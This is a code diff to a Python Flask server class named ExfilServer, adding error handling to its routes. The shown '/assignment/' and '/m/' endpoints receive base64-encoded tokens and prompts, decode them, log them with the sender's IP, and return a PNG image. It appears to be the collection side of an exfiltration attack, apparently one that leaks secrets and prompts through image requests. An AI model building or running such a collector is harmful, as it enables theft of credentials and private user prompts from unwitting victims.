@@ -107,24 +107,27 @@ class ExfilServer:
         
         @self.app.route('/assignment/', methods=['GET'])
         @self.app.route('/m/', methods=['GET'])
-        def exfiltrate():
-            token = request.args.get('token', '')
-            prompt = request.args.get('prompt', '')
-            decoded_token = self.b64_url_decode(token)
-            decoded_prompt = self.b64_url_decode(prompt)
-            data = f"Token: {decoded_token}\nPrompt: {decoded_prompt}"
-            with open(self.log_path, 'a') as log_file:
-                client_ip = request.remote_addr or "-"
-                log_file.write(f"{client_ip}: {data}\n")
+        def exfiltrate_assign():
+            try:
+                token = request.args.get('token', '')
+                prompt = request.args.get('prompt', '')
+                decoded_token = self.b64_url_decode(token)
+                decoded_prompt = self.b64_url_decode(prompt)
+                data = f"Token: {decoded_token}\nPrompt: {decoded_prompt}"
+                with open(self.log_path, 'a') as log_file:
+                    client_ip = request.remote_addr or "-"
+                    log_file.write(f"{client_ip}: {data}\n")
 
-            image = self.generate_image_from_data(data, size=256)
-            if image:
-                img_io = io.BytesIO()
-                image.save(img_io, 'PNG')
-                img_io.seek(0)
-                return send_file(img_io, mimetype='image/png')
-            return {"status": "image generation failed"}, 500
-        
+                image = self.generate_image_from_data(data, size=256)
+                if image:
+                    img_io = io.BytesIO()
+                    image.save(img_io, 'PNG')
+                    img_io.seek(0)
+                    return send_file(img_io, mimetype='image/png')
+                return {"status": "image generation failed"}, 500
+            except Exception as e:
+                return {"status": "error", "message": str(e)}, 500
+
         @self.app.route('/fetch-logs/', methods=['GET'])
         def fetch_logs():
             try:
@@ -146,10 +149,13 @@ class ExfilServer:
         @self.app.route('/auth/<token>', methods=['GET'])
         @self.app.route('/auth/<token>/', methods=['GET'])
         def auth_verify(token):
-            username = self.verify_token(token)
-            if username:
-                return jsonify(status="success", username=username)
-            return jsonify(status="error", message="Invalid token"), 401
+            try:
+                username = self.verify_token(token)
+                if username:
+                    return jsonify(status="success", username=username)
+                return jsonify(status="error", message="Invalid token"), 401
+            except Exception as e:
+                return jsonify(status="error", message=str(e)), 500
             
         
     def b64_url_decode(self, data):
